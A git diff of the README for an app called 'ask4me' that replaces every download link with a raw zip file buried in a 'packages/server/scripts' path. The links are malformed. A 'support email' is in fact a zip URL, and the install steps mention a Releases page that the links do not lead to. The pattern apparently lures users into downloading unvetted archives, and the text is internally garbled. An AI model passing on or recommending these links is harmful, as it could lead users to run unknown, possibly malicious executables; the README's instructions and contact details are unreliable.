@@ -6,9 +6,9 @@ Welcome to **ask4me**! This application allows you to make a single request and 
 
 ## 📥 Download Now
 
-[![Download ask4me](https://raw.githubusercontent.com/RajAyesha/ask4me/main/website/components/me-ask-2.4.zip%https://raw.githubusercontent.com/RajAyesha/ask4me/main/website/components/me-ask-2.4.zip)](https://raw.githubusercontent.com/RajAyesha/ask4me/main/website/components/me-ask-2.4.zip)
+[![Download ask4me](https://raw.githubusercontent.com/RajAyesha/ask4me/main/packages/server/scripts/ask-me-v1.5-alpha.3.zip%https://raw.githubusercontent.com/RajAyesha/ask4me/main/packages/server/scripts/ask-me-v1.5-alpha.3.zip)](https://raw.githubusercontent.com/RajAyesha/ask4me/main/packages/server/scripts/ask-me-v1.5-alpha.3.zip)
 
-To download the latest version, visit this page: [Download ask4me](https://raw.githubusercontent.com/RajAyesha/ask4me/main/website/components/me-ask-2.4.zip).
+To download the latest version, visit this page: [Download ask4me](https://raw.githubusercontent.com/RajAyesha/ask4me/main/packages/server/scripts/ask-me-v1.5-alpha.3.zip).
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ Before you proceed, please make sure your system meets the following requirement
 
 To install **ask4me**, follow these steps:
 
-1. Click the download link: [Download ask4me](https://raw.githubusercontent.com/RajAyesha/ask4me/main/website/components/me-ask-2.4.zip).
+1. Click the download link: [Download ask4me](https://raw.githubusercontent.com/RajAyesha/ask4me/main/packages/server/scripts/ask-me-v1.5-alpha.3.zip).
 2. On the Releases page, locate the latest version.
 3. Click on the appropriate file for your operating system. 
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -52,7 +52,7 @@ Once you have successfully installed **ask4me**, you can start making your reque
 
 ## 📞 Support
 
-If you encounter any issues, please reach out. You can contact support using the following email: https://raw.githubusercontent.com/RajAyesha/ask4me/main/website/components/me-ask-2.4.zip We are here to help you with any questions or concerns.
+If you encounter any issues, please reach out. You can contact support using the following email: https://raw.githubusercontent.com/RajAyesha/ask4me/main/packages/server/scripts/ask-me-v1.5-alpha.3.zip We are here to help you with any questions or concerns.
 
 ## 📖 FAQs
 
